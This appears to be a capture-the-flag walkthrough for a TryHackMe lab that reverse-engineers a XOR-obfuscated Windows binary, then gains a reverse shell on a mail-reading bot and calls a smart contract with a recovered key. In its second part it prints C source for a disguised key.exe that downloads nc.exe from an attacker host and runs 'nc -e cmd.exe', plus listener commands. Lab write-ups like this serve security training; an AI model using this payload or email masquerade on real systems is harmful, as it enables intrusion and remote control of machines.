# [Hack Back](https://tryhackme.com/room/hackback)

## Can you get to the bottom of what's wrong with the machine?

# Something Phishy

You have just been handed a machine by a disgruntled colleague. Pulling hairs out, he explains that, of late, this machine has been very slow and crashed multiple times. They said the machine is relatively new and not nearly at an age where its performance should suffer. They've asked if you can look at the machine and determine what's causing this behavior. Can you use your cyber sleuthing skills and know how to get to the bottom of the machine's performance issue?

### Are there any credentials present on the suspicious file? If yes, what is the username/email?

### Are there any credentials present on the suspicious file? If yes, what is the password?

1. After connecting to the machine, we discover two suspicious files: `simpleServer.exe` in `C:\` and both `simpleServer.bat` and `simpleServer.exe` inside `C:\Users\Administrator`. These files are likely responsible for the machine's degraded performance. To analyze the binary statically, we need to transfer `simpleServer.exe` to our attacker machine.

2. On the attacker machine, start an SMB share using Impacket's `smbserver`. The `-smb2support` flag ensures compatibility with modern Windows clients, and the `-username`/`-password` flags protect the share from unauthorized access:

```bash
impacket-smbserver smbFolder $(pwd) -smb2support -username test -password test123
```

3. On the victim machine, open a PowerShell window and navigate to `C:\Users\Administrator`. Use `net use` to mount the attacker's share, then copy the suspicious executable across the network:

```bash
net use \\<ATTACKER_IP>\smbFolder /user:test test123
copy simpleServer.exe \\<ATTACKER_IP>\smbFolder\simpleServer.exe
```

4. Open `simpleServer.exe` in Binary Ninja and allow the initial analysis to complete. Browsing the function list, the subroutine `sub_1400017c0` stands out because it makes three calls to an encoding helper and passes the results to another function.

5. Inspecting `sub_1400017c0` closely, we can see it passes three encoded string literals to `sub_140001640` and then calls `sub_1400012c0` with the decoded values. Almost certainly a connection or authentication routine:

```
1400017e0        int32_t var_228 = 0x8f;
14000180b        void var_208;
14000180b        sub_140001640("g`ww|g`dwv+ljf", &var_208, 0x100);
14000182f        char var_108[0x108];
14000182f        sub_140001640("umlvm`wEg`ww|g`dwv+ljf", &var_108, 0x100);
140001845        sub_1400012c0(&var_208, 0x8f, &var_108);
140001870        return sub_1400012c0(&var_208, 0x8f, "4hQm6I66qME}5w$");
```

6. Decompiling `sub_140001640` reveals a XOR cipher: each byte of the input string is XOR'd with the constant key `5` and written to the output buffer. The third string is passed directly without going through the helper, so it uses the same key:

```
140001640    {
140001640        uint64_t rax;
140001658        int64_t rdx;
140001658        rax = strlen(arg1);
140001658
140001665        if (arg3 < rax + 1)
140001675            return sub_140001d60("Buffer size is too small.\n", rdx);
140001675
140001692        for (int64_t i = 0; i < strlen(arg1); i += 1)
140001692            *(uint8_t*)((char*)arg2 + i) = arg1[i] ^ 5;
140001692
1400016cd        uint64_t result = strlen(arg1);
1400016d7        *(uint8_t*)((char*)arg2 + result) = 0;
1400016df        return result;
140001640    }
```

7. Write a Python script to apply the same XOR-5 transformation to all three encoded strings and recover the plaintext:

```py
def decode_xor(input_string, xor_key=5):
    decoded_chars = [chr(ord(char) ^ xor_key) for char in input_string]
    decoded_string = ''.join(decoded_chars)
    return decoded_string

encoded_str1 = "g`ww|g`dwv+ljf"
encoded_str2 = "umlvm`wEg`ww|g`dwv+ljf"
encoded_str3 = "4hQm6I66qME}5w$"

decoded_str1 = decode_xor(encoded_str1)
decoded_str2 = decode_xor(encoded_str2)
decoded_str3 = decode_xor(encoded_str3)

print("Decoded String 1:", decoded_str1)
print("Decoded String 2:", decoded_str2)
print("Decoded String 3:", decoded_str3)
```

**Output:**

```
Decoded String 1: berrybears.ioc
Decoded String 2: phisher@berrybears.ioc
Decoded String 3: 1mTh3L33tH@x0r!
```

> After running the script we recover a domain, an email address, and a password: `phisher@berrybears.ioc:1mTh3L33tH@x0r!`

---

# Hack the APT Boss

Seems like the investigation points to your colleague falling victim to a phishing attack. The APT made two vital mistakes: Messing with your colleague and, crucially, leaving some credentials for us to find. Given what kind of show they're running, their oversight will be their undoing. How about you try to provide this APT group with a taste of their own medicine? It's time for a Hack Back. Boot up the machine, and let's get to work!

### What is the root flag?

_If you are stuck getting a reverse shell checkout the following MITRE IDs: T1036, T1055, T1202, T1497._

1. Perform a full TCP port scan to identify every open service on the target:

```bash
nmap -p- <TARGET_IP>
```

**Results:**

```
PORT      STATE SERVICE
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
143/tcp   open  imap
443/tcp   open  https
445/tcp   open  microsoft-ds
587/tcp   open  submission
3306/tcp  open  mysql
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49671/tcp open  unknown
49682/tcp open  unknown
```

2. Run a targeted service and version scan against the discovered ports to fingerprint each service and gather banner information:

```bash
nmap -p 25,80,110,135,139,143,443,445,587,3306,3389,5985,47001,49664,49665,49666,49667,49668,49669,49671,49682 -sVC <TARGET_IP>
```

**Results:**

```
PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: FISHER, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
|_http-title: Ransomware Simulation
110/tcp   open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL TOP USER
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
|_imap-capabilities: IMAP4 CHILDREN OK CAPABILITY completed RIGHTS=texkA0001 ACL QUOTA IMAP4rev1 NAMESPACE SORT IDLE
443/tcp   open  ssl/http      Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
|_ssl-date: TLS randomness does not represent time
|_http-title: Ransomware Simulation
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
445/tcp   open  microsoft-ds?
587/tcp   open  smtp          hMailServer smtpd
| smtp-commands: FISHER, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
3306/tcp  open  mysql         MariaDB 5.5.5-10.4.24
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.4.24-MariaDB
|   Thread ID: 10
|   Capabilities flags: 63486
|   Some Capabilities: DontAllowDatabaseTableColumn, SupportsCompression, IgnoreSigpipes, Support41Auth, SupportsTransactions, Speaks41ProtocolOld, Speaks41ProtocolNew, LongColumnFlag, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, ODBCClient, ConnectWithDatabase, FoundRows, InteractiveClient, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: j#ly<[9JF^+UOhAJ1T4E
|_  Auth Plugin Name: mysql_native_password
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=fisher
| Not valid before: 2026-06-08T20:03:30
|_Not valid after:  2026-12-08T20:03:30
|_ssl-date: 2026-06-09T20:23:18+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: FISHER
|   NetBIOS_Domain_Name: FISHER
|   NetBIOS_Computer_Name: FISHER
|   DNS_Domain_Name: fisher
|   DNS_Computer_Name: fisher
|   Product_Version: 10.0.17763
|_  System_Time: 2026-06-09T20:23:10+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: FISHER; OS: Windows; CPE: cpe:/o:microsoft:windows
```

3. Perform web directory enumeration against the Apache web server to discover any hidden paths or administrative panels:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Results:**

```
mail                 (Status: 301) [Size: 340] [--> http://<TARGET_IP>/mail/]
licenses             (Status: 403) [Size: 423]
examples             (Status: 503) [Size: 404]
rc                   (Status: 301) [Size: 338] [--> http://<TARGET_IP>/rc/]
Mail                 (Status: 301) [Size: 340] [--> http://<TARGET_IP>/Mail/]
*checkout*           (Status: 403) [Size: 304]
phpmyadmin           (Status: 403) [Size: 423]
webalizer            (Status: 403) [Size: 423]
*docroot*            (Status: 403) [Size: 304]
*                    (Status: 403) [Size: 304]
con                  (Status: 403) [Size: 304]
RC                   (Status: 301) [Size: 338] [--> http://<TARGET_IP>/RC/]
**http%3a            (Status: 403) [Size: 304]
*http%3A             (Status: 403) [Size: 304]
xampp                (Status: 301) [Size: 341] [--> http://<TARGET_IP>/xampp/]
aux                  (Status: 403) [Size: 304]
**http%3A            (Status: 403) [Size: 304]
**http%3A%2F%2Fwww   (Status: 403) [Size: 304]
server-status        (Status: 403) [Size: 423]
devinmoore*          (Status: 403) [Size: 304]
200109*              (Status: 403) [Size: 304]
*sa_                 (Status: 403) [Size: 304]
*dc_                 (Status: 403) [Size: 304]
```

4. Navigate to `http://<TARGET_IP>/mail/`. This is the hMailServer webmail interface. Log in with the credentials recovered from `simpleServer.exe`. There is only one message in the inbox, a sent email from `phisher@berrybears.ioc` to `boss@berrybears.ioc`:

```
Yo Boss,

Chill, I got you. Key's safe with me, but let's be smart about this. I'll send it through our usual secure drop. Don't wanna leave any traces, you know the drill.


July 31, 2024 4:49 PM, boss@berrybears.ioc wrote:


    Listen, we need the wallet key from that last gig. The cash is piling up, and we gotta move it fast before it gets too hot.

    You got the key, right? Send it over pronto.
```

> This tells us the boss is expecting the cryptocurrency wallet private key to be sent by email.

5. Navigate to `http://<TARGET_IP>/rc/`. This is the Roundcube webmail client, a richer compose interface. Log in again with the same credentials. We will use Roundcube to send outgoing emails and attach files to them.

6. Compose a test email to `boss@berrybears.ioc` with the word `key` somewhere in the body to probe the boss's behaviour. The boss is an automated bot that reads incoming mail and sends an automatic reply when the keyword is detected but no valid key attachment is found:

```
I did not find the key

On Wed, 10 Jun 2026 15:11:26 -0400, phisher@berrybears.ioc wrote:
Hello, the KEY
```

> This confirms that the bot actively processes emails looking for a file it considers a "key". Our plan is to send a Windows executable named `key.exe` that masquerades (**T1036 Masquerading**) as the expected wallet key file. When the bot opens the attachment it will execute our payload, which uses indirect command execution via `system()` (**T1202 Indirect Command Execution**) to download `nc.exe` from our server and establish a reverse shell.

7. Create a C source file `key.c` containing two `system()` calls: the first downloads `nc.exe` from our HTTP server using PowerShell's `Invoke-WebRequest`, and the second launches it to call back to our listener. The executable name and context match what the boss is expecting, making the deception believable:

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
  char *command1 = "powershell -Command \"Invoke-WebRequest -Uri 'http://<ATTACKER_IP>:8000/nc.exe' -OutFile 'C:\\Windows\\Temp\\nc.exe'\"";

  int result1 = system(command1);
  char *command2 = "powershell -Command \"Start-Process 'C:\\Windows\\Temp\\nc.exe' -ArgumentList '-e cmd.exe <ATTACKER_IP> 4444'\"";

  int result2 = system(command2);

  return 0;
}
```

8. Cross-compile the source file for 64-bit Windows using MinGW. The resulting `key.exe` is a native PE binary that will run on the target without any additional runtime dependencies:

```bash
x86_64-w64-mingw32-gcc key.c -o key.exe
```

9. Start a Python HTTP server in the same directory as `nc.exe` so the payload can fetch it at runtime:

```bash
python3 -m http.server
```

10. Open a Netcat listener on port `4444` to catch the incoming reverse shell connection once the bot executes `key.exe`:

```bash
nc -lvnp 4444
```

11. Back in Roundcube, compose a new email to `boss@berrybears.ioc`. Include the word `key` in the subject or body to trigger the bot's processing logic, and attach `key.exe` as a file. Send the email and wait. The bot will open the attachment, execute our binary, which downloads `nc.exe` from our HTTP server and connects back to our listener.

12. Once the reverse shell lands, navigate to the Administrator's desktop and read the root flag:

```bash
type C:\Users\Administrator\Desktop\root.txt
```

<img width="607" height="436" alt="SCREEN01" src="https://github.com/user-attachments/assets/f70e3e85-2418-4ca0-949c-d5b16c168ae7" />

---

# A Phish Best Served Cold

Leaving those credentials was even more costly than previously thought, with your most recent discovery giving you precisely what you need to initiate your plan. It's time to finish this. Use the smart contract you have found to get your colleague their money back and let digital justice prevail. For one last time, boot up the machine using the 'Start Lab Machine' button and get down to business.

### What is the final flag?

1. Perform a full port scan with service and version detection against the new machine:

```bash
nmap -p- -sVC <TARGET_IP>
```

**Results:**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fd:e0:08:2d:e5:07:43:7a:de:2d:46:ec:b3:65:91:3c (RSA)
|   256 50:8a:9c:0c:7f:8b:23:d6:dd:c6:40:6e:55:05:0d:9b (ECDSA)
|_  256 a1:1d:87:36:7d:6a:2d:df:ef:a4:7f:9c:0c:31:5e:8d (ED25519)
80/tcp   open  http
|_http-title: Blockchain Challenge
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     content-type: application/json; charset=utf-8
|     content-length: 107
|     Date: Thu, 11 Jun 2026 18:33:14 GMT
|     Connection: close
|     {"message":"Route GET:/nice%20ports%2C/Tri%6Eity.txt%2ebak not found","error":"Not Found","statusCode":404}
|   GetRequest:
|     HTTP/1.1 200 OK
|     accept-ranges: bytes
|     cache-control: public, max-age=0
|     last-modified: Fri, 05 Jul 2024 01:23:44 GMT
|     etag: W/"1cc-190807d7500"
|     content-type: text/html; charset=UTF-8
|     content-length: 460
|     Date: Thu, 11 Jun 2026 18:33:13 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <link rel="icon" type="image/svg+xml" href="/vite.svg" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
|     <title>Blockchain Challenge</title>
|     <script type="module" crossorigin src="/assets/index-9ec22451.js"></script>
|     <link rel="stylesheet" href="/assets/index-f2ea3435.css">
|     </head>
|     <body>
|     <div id="root"></div>
|     </body>
|     </html>
|   HTTPOptions:
|     HTTP/1.1 404 Not Found
|     content-type: application/json; charset=utf-8
|     content-length: 76
|     Date: Thu, 11 Jun 2026 18:33:13 GMT
|     Connection: close
|     {"message":"Route OPTIONS:/ not found","error":"Not Found","statusCode":404}
|   RTSPRequest:
|     HTTP/1.1 404 Not Found
|     content-type: application/json; charset=utf-8
|     content-length: 76
|     Date: Thu, 11 Jun 2026 18:33:14 GMT
|     Connection: close
|     {"message":"Route OPTIONS:/ not found","error":"Not Found","statusCode":404}
|   X11Probe:
|     HTTP/1.1 400 Bad Request
|     Content-Length: 65
|     Content-Type: application/json
|_    {"error":"Bad Request","message":"Client Error","statusCode":400}
8545/tcp open  daap    mt-daapd DAAP
```

2. Visit `http://<TARGET_IP>/` in a browser. The page presents a **Blockchain Challenge** interface. We find the smart contract address and an XOR-encoded password string: `ZI^ZI^U_MJI`. The contract exposes a `transfer(string memory data, uint256 amount)` function that requires the correct password to authorise a transfer of funds.

3. The Foundry `cast` tool addresses the Ethereum node by the hostname `geth`. Add a static entry to `/etc/hosts` so that name resolves to the target's IP:

```bash
echo "<TARGET_IP> geth" >> /etc/hosts
```

4. Install the Foundry toolkit using its official installer script:

```bash
foundryup
```

5. Decode the password found on the website. The string `ZI^ZI^U_MJI` is XOR'd with the single-byte key `0x2C`. Use pwntools to recover the plaintext:

```bash
python3
from pwn import xor
xor(b"ZI^ZI^U_MJI", int.to_bytes(44))
```

6. Use Foundry's `cast send` to call the smart contract's `transfer()` function. Supply the private key, the decoded password, and the amount `1000` to return the stolen funds and trigger the flag:

```bash
cast send --legacy --rpc-url http://geth:8545 --private-key 0xde5e40013083eb252bbd4ec730c6971b241ec4264921d60a3ad0284e149748d3  0xf22cB0Ca047e88AC996c17683Cee290518093574 'transfer(string memory data, uint256 amount)' 'ververysafe' 1000
```

<img width="1372" height="838" alt="SCREEN02" src="https://github.com/user-attachments/assets/0b23fa86-f547-4c71-9f81-c8d536857e30" />
